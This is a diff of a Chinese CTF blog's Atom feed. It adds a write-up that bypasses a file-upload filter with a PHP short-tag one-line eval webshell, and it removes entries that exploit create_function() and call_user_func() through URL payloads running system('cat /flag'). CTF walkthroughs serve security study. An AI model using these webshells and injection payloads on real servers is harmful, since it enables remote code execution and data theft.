@@ -42,6 +42,31 @@
   </entry>
   
   <entry>
+    <title>PHP标签绕过上传</title>
+    <link href="http://example.com/2024/03/05/PHP%E6%A0%87%E7%AD%BE%E7%BB%95%E8%BF%87%E4%B8%8A%E4%BC%A0/"/>
+    <id>http://example.com/2024/03/05/PHP%E6%A0%87%E7%AD%BE%E7%BB%95%E8%BF%87%E4%B8%8A%E4%BC%A0/</id>
+    <published>2024-03-05T10:13:26.000Z</published>
+    <updated>2024-04-18T02:40:06.072Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>网页有上传文件的入口，先尝试上传一个一句话木马</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cssec&#x27;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>网页提示</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">服务器检测到&lt;?php，启动了查杀程序。</span><br></pre></td></tr></table></figure><p>对php 标签的检验，修改一句话木马为</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;? eval($_POST[&#x27;cssec&#x27;]); ?&gt;</span><br></pre></td></tr></table></figure><p>使用一种php短标签，可以绕过</p><figure class="highlight handlebars"><table><tr><td class="code"><pre><span class="line"><span class="language-xml">文件 exp.php 已经上传。</span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">文件路径: uploads/exp.php</span></span><br></pre></td></tr></table></figure><p>连接木马，得到flag</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;思路&quot;&gt;&lt;a href=&quot;#思路&quot; class=&quot;headerlink&quot; title=&quot;思路&quot;&gt;&lt;/a&gt;思路&lt;/h1&gt;&lt;p&gt;网页有上传文件的入口，先尝试上传一个一句话木马&lt;/p&gt;
+&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;</summary>
+      
+    
+    
+    
+    <category term="文件上传" scheme="http://example.com/categories/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
+    
+    
+    <category term="PHP标签绕过" scheme="http://example.com/tags/PHP%E6%A0%87%E7%AD%BE%E7%BB%95%E8%BF%87/"/>
+    
+  </entry>
+  
+  <entry>
     <title>文件头绕过上传</title>
     <link href="http://example.com/2024/03/05/%E6%96%87%E4%BB%B6%E5%A4%B4%E7%BB%95%E8%BF%87%E4%B8%8A%E4%BC%A0/"/>
     <id>http://example.com/2024/03/05/%E6%96%87%E4%BB%B6%E5%A4%B4%E7%BB%95%E8%BF%87%E4%B8%8A%E4%BC%A0/</id>
@@ -468,30 +493,6 @@
     <updated>2024-03-06T09:21:14.607Z</updated>
     
     <content type="html"><![CDATA[<h1 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">    <span class="variable">$code</span> = <span class="string">&#x27;echo&#x27;</span>.<span class="variable">$func</span>.<span class="string">&#x27;id:&#x27;</span>.<span class="variable">$id</span>.<span class="string">&#x27;;&#x27;</span>;</span><br><span class="line">    <span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;$func&#x27;</span>, <span class="variable">$code</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;服务器剩余防御：1层&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span>         </span><br></pre></td></tr></table></figure><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>存在危险函数create_function()，可以适当构造执行系统命令，使用下面的参数即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://ctf.seek2.top:32814/?id=&#125;system(%27cat%20/flag%27);//</span><br></pre></td></tr></table></figure><h1 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h1><p><code>create_function()</code> 是 PHP 的一个内置函数，它可以创建一个匿名的 lambda 函数，并返回这个函数的引用。这个函数的实现基于 <code>eval()</code>，因此它也存在执行任意 PHP 代码的风险。</p><p>当传入一个以 <code>&#125;</code> 开头的字符串时，<code>eval()</code> 会认为当前的函数体已经结束，然后执行后面的代码。例如，以下代码：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$func</span> = <span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#125;system(&quot;chdir&quot;);//&#x27;</span>);</span><br></pre></td></tr></table></figure><p>在这个例子中，<code>create_function()</code> 会创建一个如下的函数：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">&#125;<span class="title function_ invoke__">system</span>(<span class="string">&quot;ls&quot;</span>);<span class="comment">//&#x27;</span></span><br></pre></td></tr></table></figure><p>这个函数的主体是空的，然后执行 <code>system(&quot;ls&quot;);</code>。</p><p><code>//</code> 在这里的作用是防止 <code>&quot;&#125;system(&#39;chdir&#39;);&quot;</code> 被完整解析，导致语法错误。也可以使用 <code>#</code> 或 <code>&#123;</code> 来达到同样的效果</p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h1 id=&quot;源码&quot;&gt;&lt;a href=&quot;#源码&quot; class=&quot;headerlink&quot; title=&quot;源码&quot;&gt;&lt;/a&gt;源码&lt;/h1&gt;&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span clas</summary>
-      
-    
-    
-    
-    <category term="PHP代码审计" scheme="http://example.com/categories/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
-    
-    
-    <category term="PHP常见函数" scheme="http://example.com/tags/PHP%E5%B8%B8%E8%A7%81%E5%87%BD%E6%95%B0/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>call_user_func()</title>
-    <link href="http://example.com/2024/03/05/call_user_func()/"/>
-    <id>http://example.com/2024/03/05/call_user_func()/</id>
-    <published>2024-03-05T10:13:08.000Z</published>
-    <updated>2024-03-06T09:21:04.431Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;func&#x27;</span>]) || <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;arg&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;func&#x27;</span>], <span class="variable">$_GET</span>[<span class="string">&#x27;arg&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;服务器剩余防御：1层&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span>          </span><br></pre></td></tr></table></figure><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>存在回调函数call_user_func，可以构造函数执行系统命令，使用下面的参数即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://ctf.seek2.top:32811/?func=system&amp;arg=cat%20/flag</span><br></pre></td></tr></table></figure><p>第一个参数是函数名，第二个是参数</p><h1 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h1><p><strong>call_user_func()</strong> 是 PHP 中的一个内置函数，它的作用是调用回调函数并传递参数。这个函数接受两个参数：第一个参数是要调用的函数名（或者是一个包含对象和方法名的数组），第二个参数是要传递给函数的参数。</p><p>举个栗子，使用 <code>call_user_func()</code> 来调用 <code>system</code> 函数，并传递 <code>ls</code> 作为参数。<code>system</code> 函数是 PHP 的一个内置函数，可以执行系统命令。<code>ls</code> 是 Unix 系统中的一个命令，用于列出目录中的文件。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;ls&#x27;</span>); <span class="comment">// 等价于system(&#x27;ls&#x27;);</span></span><br></pre></td></tr></table></figure><p>这行代码相当于在终端执行 <code>ls</code> 命令，并将结果输出。</p>]]></content>
     
     
       
